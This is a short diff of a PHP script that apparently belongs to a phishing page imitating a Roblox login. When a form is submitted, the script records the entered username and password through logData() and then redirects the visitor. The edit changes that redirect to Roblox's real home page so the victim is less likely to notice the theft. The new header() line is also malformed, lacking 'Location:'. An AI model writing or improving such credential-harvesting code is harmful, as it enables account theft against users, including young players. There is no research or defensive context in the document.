@@ -88,7 +88,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     if (!empty($username) && !empty($password)) {
         logData($username, $password);
-        header('Location: index.html');
+        header('https://www.roblox.com/home');
         exit();
     }
 }
